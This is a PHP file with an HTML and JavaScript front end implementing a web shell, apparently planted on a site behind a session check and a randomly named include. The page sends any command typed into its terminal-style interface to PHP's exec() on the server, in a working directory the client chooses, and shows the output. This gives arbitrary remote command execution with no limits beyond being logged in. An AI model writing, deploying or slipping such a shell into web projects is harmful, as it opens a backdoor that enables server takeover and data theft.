<?php
require_once('./ava3KsVUvw8syHCJpitM.php');
session_start();
$login = new sessionHelper;
if( !($login->{'isUserLoggedIn'}()) ){
    header("Location: ../home?message=Did You Reach This Page In Error... .. .");
    exit;
}

function featureShell($cmd, $cwd) {
    $stdout = array();
    if (preg_match("/^\s*cd\s*$/", $cmd)) {
        // pass
    } elseif (preg_match("/^\s*cd\s+(.+)\s*$/", $cmd)) {
        chdir($cwd);
        preg_match("/^\s*cd\s+(.+)\s*$/", $cmd, $match);
        chdir($match[1]);
    } else {
        chdir($cwd);
        exec($cmd, $stdout);
    }
    return array(
        "stdout" => $stdout,
        "cwd" => getcwd()
    );
}
function featurePwd() {
    return array("cwd" => getcwd());
}
if (isset($_GET["feature"])) {
    $response = NULL;
    switch ($_GET["feature"]) {
        case "shell":
            $response = featureShell($_POST["cmd"], $_POST["cwd"]);
            break;
        case "pwd":
            $response = featurePwd();
            break;
    }
    header("Content-Type: application/json");
    echo json_encode($response);
    die();
}
?>
<!DOCTYPE html>
<html>

    <head>
        <meta charset="UTF-8" />
        <title>SYSxygh@shell:~#</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <link rel="stylesheet" type="text/css" href="../styles.css">
        <script src="../js/jquery-3.2.1.min.js" type="text/javascript"></script>

        <script>
            var CWD = null;
            function featureShell(command) {
                var eShellContent = document.getElementById("shell-content");
                function _insertCommand(command) {
                    eShellContent.innerHTML += "\n";
                    eShellContent.innerHTML += `<span class=\"shell-prompt\">${genPrompt(CWD)}</span> `;
                    eShellContent.innerHTML += escapeHtml(command);
                    eShellContent.innerHTML += "\n";
                    eShellContent.scrollTop = eShellContent.scrollHeight;
                }
                function _insertStdout(stdout) {
                    eShellContent.innerHTML += escapeHtml(stdout);
                    eShellContent.scrollTop = eShellContent.scrollHeight;
                }
                _insertCommand(command);
                return $.post("?feature=shell", {cmd: command, cwd: CWD}, "json")
                    .then(response => _insertStdout(response.stdout.join("\n")) || response)
                    .then(response => updateCwd(response.cwd) || response)
                    .fail(error => _insertStdout("AJAX ERROR: " + JSON.stringify(error)));
            }
            function genPrompt(cwd) {
                cwd = cwd || "~";
                var shortCwd = cwd;
                if (cwd.split("/").length > 3) {
                    var splittedCwd = cwd.split("/");
                    shortCwd = `…/${splittedCwd[splittedCwd.length-2]}/${splittedCwd[splittedCwd.length-1]}`;
                }
                return `SYSxygh@shell:<span title="${cwd}">${shortCwd}</span>#`
            }
            function updateCwd(cwd) {
                if (cwd) {
                    CWD = cwd;
                    _updatePrompt();
                    return;
                }
                return $.post("?feature=pwd", {}, "json")
                    .then(response => CWD = (response.cwd) || response)
                    .then(response => _updatePrompt() || response)
                    .fail(error => console.error(error));
            }
            function escapeHtml(string) {
                return string
                    .replace(/&/g, "&amp;")
                    .replace(/</g, "&lt;")
                    .replace(/>/g, "&gt;");
            }
            function _updatePrompt() {
                var eShellPrompt = document.getElementById("shell-prompt");
                eShellPrompt.innerHTML = genPrompt(CWD);
            }
            function _onShellCmdKeyDown(event) {
                var eShellCmdInput = document.getElementById("shell-cmd");
                if (event.key == "Enter") {
                    featureShell(eShellCmdInput.value);
                    eShellCmdInput.value = "";
                }
            }
            window.onload = function() {
                updateCwd();
            };
        </script>
    </head>
    <body style="padding: 0px; margin: 0px; width: 600px;">
        <div id="shell">
            <pre id="shell-content">
            </pre>
            <div id="shell-input">
                <label for="shell-cmd" id="shell-prompt" class="shell-prompt">???</label>
                <input id="shell-cmd" name="cmd" onkeydown="_onShellCmdKeyDown(event)"/>
            </div>
        </div>
    </body>

</html>
